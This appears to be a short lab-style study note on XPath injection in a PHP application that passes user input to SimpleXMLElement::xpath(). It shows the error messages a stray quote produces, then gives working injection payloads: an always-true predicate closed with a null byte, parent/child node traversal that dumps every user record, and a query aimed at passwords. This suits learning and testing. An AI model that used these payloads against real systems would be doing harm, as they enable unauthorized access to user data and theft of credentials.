---
tags: xml
---

Here the code uses the user’s input inside and XPath expression. The easiest way to think of it is that it’s similar to an SQL injection.

If we are lucky, we can get something like this upon injecting a singe quote:

```
### **Warning**: SimpleXMLElement::xpath(): Invalid predicate in **/var/www/index.php** on line **22**  
  
**Warning**: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in **/var/www/index.php** on line **22**  
  
**Warning**: Variable passed to each() is not an array or object in **/var/www/index.php** on line **23**
```

Luckily, XPath is very similar to SQL in the way of exploitation too.

```ad-note
We use NULL Bytes to comment out the rest of the code (`%00`)
```

This is a sample payload that gets us all results:

```
hacker' or 1=1]%00
```

We can try to find the child of the current node:

```
'%20or%201=1]/child::node()%00
```

This doesn’t yield much results. Let’s try climbing up the node hierarchy.

This can be done in this way:

```
hacker'%20or%201=1]/parent::*/child::node()%00
```

here we used `/parent::*` to get the parent node, it does say `*` but since there is only one parent we get the parent back immediately. 

This does return every user and every data for the user. Now we could also have used:

```
hacker']/parent::*/password%00
```

To only get the passwords.